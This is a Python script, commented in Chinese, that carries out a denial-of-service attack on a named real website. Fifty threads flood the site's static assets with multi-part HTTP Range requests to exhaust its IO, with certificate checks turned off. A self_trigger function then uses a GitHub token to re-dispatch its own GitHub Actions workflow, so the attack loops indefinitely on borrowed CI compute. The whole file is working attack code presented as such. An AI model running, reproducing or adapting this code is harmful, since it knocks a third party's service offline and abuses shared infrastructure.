#!/usr/bin/env python3
"""自循环瘫痪攻击：攻完后自动重新触发自己 → 无限循环"""
import urllib.request, json, sys, os, time, threading, random, ssl, argparse

TARGET = "https://www.xnmoe.com"
ASSETS = [
    "/css/base.css", "/js/api.js?v=2.0",
    "/assets/images/banner.jpg", "/assets/images/pfp.png",
    "/assets/images/logo.png", "/assets/images/favicon.ico",
]
DURATION = 1200  # 20 分钟
WORKERS = 50
DONE_FILE = "/tmp/sustain_done"

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def attack():
    """Range IO 耗尽攻击"""
    running = [True]
    stats = {"ok": 0, "to": 0, "err": 0}
    lock = threading.Lock()

    def worker():
        while running[0]:
            try:
                a = random.choice(ASSETS)
                url = f"{TARGET}{a}?_cb={random.randint(0,999999999)}"
                ranges = "bytes=" + ",".join(f"{random.randint(0,200000)}-" for _ in range(12))
                req = urllib.request.Request(url)
                req.add_header("Range", ranges)
                req.add_header("User-Agent", "Mozilla/5.0")
                resp = urllib.request.urlopen(req, timeout=12, context=ssl_ctx)
                resp.read()
                with lock: stats["ok"] += 1
            except urllib.error.URLError as e:
                with lock:
                    if "timed out" in str(e.reason).lower(): stats["to"] += 1
                    else: stats["err"] += 1
            except: pass

    for _ in range(WORKERS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    start = time.time()
    print(f"Attack: {WORKERS} workers x {DURATION}s | {time.strftime('%H:%M:%S')}")

    update_interval = 120
    next_report = start + update_interval
    while time.time() - start < DURATION:
        time.sleep(10)
        if time.time() >= next_report:
            elapsed = time.time() - start
            with lock: s = dict(stats)
            print(f"  [{elapsed/60:.0f}m] OK={s['ok']} TO={s['to']} ERR={s['err']}")
            next_report += update_interval

    running[0] = False
    elapsed = time.time() - start
    with lock: s = dict(stats)
    total = s["ok"] + s["to"] + s["err"]
    print(f"FINAL: {s['ok']} OK, {s['to']} TO, {s['err']} ERR, {total} total in {elapsed:.0f}s")

    # Mark done for trigger node
    open(DONE_FILE, "w").write("done")
    print("Attack phase complete. Waiting for self-trigger...")
    time.sleep(5)


def self_trigger():
    """用 GH_TOKEN 重新触发当前工作流"""
    token = os.environ.get("GH_TOKEN")
    if not token:
        print("No GH_TOKEN")
        sys.exit(1)

    # Get run info to find workflow ID
    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/ghostbook-fleet")

    url = f"https://api.github.com/repos/{repo}/actions/workflows"
    req = urllib.request.Request(url)
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Accept", "application/vnd.github+json")

    workflows = json.loads(urllib.request.urlopen(req).read())["workflows"]
    wf_id = None
    for wf in workflows:
        if "sustain" in wf["path"]:
            wf_id = wf["id"]
            break

    if not wf_id:
        print("Workflow not found!")
        sys.exit(1)

    dispatch_url = f"https://api.github.com/repos/{repo}/actions/workflows/{wf_id}/dispatches"
    body = json.dumps({"ref": "main"}).encode()
    req2 = urllib.request.Request(dispatch_url, data=body, method="POST")
    req2.add_header("Authorization", f"Bearer {token}")
    req2.add_header("Accept", "application/vnd.github+json")
    req2.add_header("Content-Type", "application/json")
    resp = urllib.request.urlopen(req2)

    print(f"Self re-trigger: HTTP {resp.status}")
    if resp.status == 204:
        print("NEXT WAVE SCHEDULED - chain continues!")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--attack-only", action="store_true")
    p.add_argument("--trigger-only", action="store_true")
    args = p.parse_args()

    if args.attack_only:
        attack()
    elif args.trigger_only:
        # Wait for attack nodes to finish
        print("Waiting for attack nodes...")
        for _ in range(500):
            if os.path.exists(DONE_FILE):
                break
            time.sleep(2)
        time.sleep(10)  # Extra buffer
        self_trigger()
    else:
        attack()
        self_trigger()
